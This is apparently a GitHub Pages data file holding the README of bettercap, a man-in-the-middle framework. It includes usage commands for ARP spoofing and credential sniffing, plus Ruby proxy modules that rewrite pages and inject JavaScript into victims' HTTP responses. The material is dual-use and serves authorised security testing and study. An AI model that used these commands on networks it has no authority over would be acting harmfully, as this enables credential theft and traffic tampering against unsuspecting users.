{"name":"Bettercap","tagline":"A complete, modular, portable and easily extensible MITM framework.","body":"**bettercap** is a complete, modular, portable and easily extensible **MITM** tool and framework with every kind of diagnostic\r\nand offensive feature you could need in order to perform a man in the middle attack.\r\n\r\nMOTIVATIONS\r\n===\r\n\r\n> Yet another MITM tool? C'mon, really?!!?\r\n\r\nThis is exactly what you are thinking right now, isn't it? :D\r\nBut allow yourself to think about it for 5 more minutes ... what you should be really asking is:\r\n\r\n> Does a complete, modular, portable and easy to extend MITM tool actually exist?\r\n\r\nIf your answer is \"ettercap\", let me tell you something:\r\n\r\n* ettercap **was** a great tool, but it made its time.\r\n* ettercap filters **do not** work most of the times, are outdated and hard to implement due to the specific language they're implemented in.\r\n* ettercap is freaking **unstable** on big networks ... try to launch the host discovery on a bigger network rather than the usual /24 ;)\r\n* yeah you can see connections and raw pcap stuff, **nice toy**, but **as a professional researcher I want to see only relevant stuff**.\r\n* unless you're a C/C++ developer, you can't easily extend ettercap or make your own module.\r\n\r\nIndeed you could use more than just one tool ... maybe [arpspoof](http://linux.die.net/man/8/arpspoof) to perform the actual poisoning, [mitmproxy](http://mitmproxy.org) to intercept HTTP stuff and inject your payloads and so forth ... I don't know about you, but I **hate** when I need to use a dozen of tools just to perform one single attack, especially when I need to do some black magic in order to make all of them work on my distro or on OSX ... what about the [KISS](https://en.wikipedia.org/wiki/KISS_principle) principle?\r\n\r\nSo **bettercap** was born ( isn't the name pure genius? XD ) ...\r\n\r\nHOST DISCOVERY + ARP MAN IN THE MIDDLE\r\n=== \r\n\r\nYou can target the whole network or a single known address, it doesn't really matter, bettercap arp spoofing capabilities and its multiple hosts discovery agents will do the dirty work for you.  \r\nJust launch the tool and wait for it to do its job ... again, [KISS!](https://en.wikipedia.org/wiki/KISS_principle)\r\n\r\n![credentials](https://raw.github.com/evilsocket/bettercap/master/pics/discovery.png)\r\n\r\nCREDENTIALS SNIFFER\r\n===\r\n\r\nThe built in sniffer is currently able to dissect and print from the network the following informations:\r\n\r\n- URLs being visited.\r\n- HTTPS host being visited.\r\n- HTTP POSTed data.\r\n- HTTP Basic and Digest authentications.\r\n- FTP credentials.\r\n- IRC credentials.\r\n- POP, IMAP and SMTP credentials.\r\n- NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.\r\n\r\n![credentials](https://raw.github.com/evilsocket/bettercap/master/pics/credentials.png)\r\n\r\n**Examples**\r\n\r\nDefault sniffer mode, all parsers enabled:\r\n    \r\n    sudo bettercap -X\r\n    \r\nEnable sniffer and load only specified parsers:\r\n    \r\n    sudo bettercap -X -P \"FTP,HTTPAUTH,MAIL,NTLMSS\"\r\n\r\nEnable sniffer + all parsers and parse local traffic as well:\r\n    \r\n    sudo bettercap -X -L\r\n    \r\nMODULAR TRANSPARENT PROXY\r\n===\r\n\r\nA modular transparent proxy can be started with the --proxy argument, by default it won't do anything \r\nbut logging HTTP requests, but if you specify a **--proxy-module** argument you will be able to load\r\nyour own modules and manipulate HTTP traffic as you like.  \r\n\r\n![credentials](https://raw.github.com/evilsocket/bettercap/master/pics/proxy.png)\r\n\r\n**Examples**\r\n\r\nEnable proxy on default ( 8080 ) port with no modules ( quite useless ): \r\n    \r\n    sudo bettercap --proxy\r\n\r\nEnable proxy and use a custom port:\r\n    \r\n    sudo bettercap --proxy --proxy-port=8081\r\n    \r\nEnable proxy and load the module **example_proxy_module.rb**:\r\n    \r\n    sudo bettercap --proxy --proxy-module=example_proxy_module.rb\r\n\r\nDisable spoofer and enable proxy ( stand alone proxy mode ):\r\n\r\n    sudo bettercap -S NONE --proxy\r\n\r\n**Modules**\r\n\r\nYou can easily implement a module to inject data into pages or just inspect the\r\nrequests/responses creating a ruby file and passing it to bettercap with the --proxy-module argument, \r\nthe following is a sample module that injects some contents into the title tag of each html page.\r\n\r\n```ruby\r\nclass HackTitle < Proxy::Module\r\n  def on_request( request, response )\r\n    # is it a html page?\r\n    if response.content_type == 'text/html'\r\n      Logger.info \"Hacking http://#{request.host}#{request.url} title tag\"\r\n      # make sure to use sub! or gsub! to update the instance\r\n      response.body.sub!( '<title>', '<title> !!! HACKED !!! ' )\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nBUILTIN HTTP SERVER\r\n===\r\n\r\nYou want to serve your custom javascript files on the network? Maybe you wanna inject some custom\r\nscript or image into HTTP responses using a transparent proxy module but you got no public server\r\nto use? **no worries dude** :D  \r\nA builtin HTTP server comes with bettercap, allowing you to serve custom contents from your own\r\nmachine without installing and configuring other softwares such as Apache, nginx or lighttpd. \r\n\r\nYou could use a **proxy module** like the following:\r\n\r\n```ruby\r\nclass InjectJS < Proxy::Module\r\n  def on_request( request, response )\r\n    # is it a html page?\r\n    if response.content_type == 'text/html'\r\n      Logger.info \"Injecting javascript file into http://#{request.host}#{request.url} page\"\r\n      # get the local interface address and HTTPD port\r\n      localaddr = Context.get.iface[:ip_saddr]\r\n      localport = Context.get.options[:httpd_port]\r\n      # inject the js\r\n      response.body.sub!( '</title>', \"<script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script></title>\" )\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nAnd then use it to inject the js file in every HTTP response of the network, using bettercap itself\r\nto serve the file:\r\n\r\n    sudo bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb \r\n\r\nHOW TO INSTALL\r\n===\r\n\r\n**Stable Release ( GEM )**\r\n    \r\n    gem install bettercap\r\n    \r\n**From Source**\r\n    \r\n    git clone https://github.com/evilsocket/bettercap\r\n    cd bettercap\r\n    gem build bettercap.gemspec\r\n    sudo gem install bettercap*.gem\r\n\r\nDEPENDS\r\n===\r\n\r\nAll dependencies will be automatically installed through the GEM system.\r\n\r\n- colorize (**gem install colorize**)\r\n- packetfu (**gem install packetfu**)\r\n- pcaprub  (**gem install pcaprub**) [sudo apt-get install ruby-dev libpcap-dev]","google":"","note":"Don't delete this file! It's used internally to help with page regeneration."}